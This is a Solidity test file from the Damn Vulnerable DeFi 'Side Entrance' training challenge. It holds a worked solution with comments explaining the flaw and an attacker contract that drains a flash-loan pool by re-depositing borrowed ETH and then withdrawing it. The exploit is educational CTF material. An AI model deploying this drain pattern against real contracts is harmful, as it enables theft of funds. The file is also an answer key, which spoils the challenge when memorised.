// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        /**
         * VULNERABILITY EXPLANATION:
         * The SideEntranceLenderPool checks that its ETH balance hasn't decreased after a flash loan,
         * but it tracks user balances separately in a mapping. The flaw is that:
         * 1. During the flash loan callback, we can call deposit() with the borrowed ETH
         * 2. This returns ETH to the pool (passing the balance check) but credits our balances mapping
         * 3. After the flash loan, we have a legitimate balance to withdraw
         *
         * EXPLOIT STRATEGY:
         * 1. Flash loan the entire pool balance
         * 2. In execute() callback, deposit the borrowed ETH back to the pool
         * 3. Flash loan completes (balance check passes since ETH is back in pool)
         * 4. Call withdraw() to drain our credited balance
         * 5. Send to recovery
         */
        
        // Deploy attacker contract and execute exploit
        SideEntranceAttacker attacker = new SideEntranceAttacker(pool, recovery);
        attacker.attack(ETHER_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

/**
 * @notice Attacker contract implementing IFlashLoanEtherReceiver
 * @dev Deposits borrowed ETH during callback, then withdraws to drain pool
 */
contract SideEntranceAttacker {
    SideEntranceLenderPool private pool;
    address private recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    // Called by flash loan - deposit the borrowed ETH to credit our balance
    function execute() external payable {
        // Deposit borrowed ETH back to pool (credits our balance in the mapping)
        pool.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        // Step 1: Flash loan triggers execute() callback
        pool.flashLoan(amount);
        
        // Step 2: Withdraw our credited balance (pool balance check already passed)
        pool.withdraw();
        
        // Step 3: Send to recovery
        payable(recovery).transfer(address(this).balance);
    }

    // Allow receiving ETH from withdraw
    receive() external payable {}
}
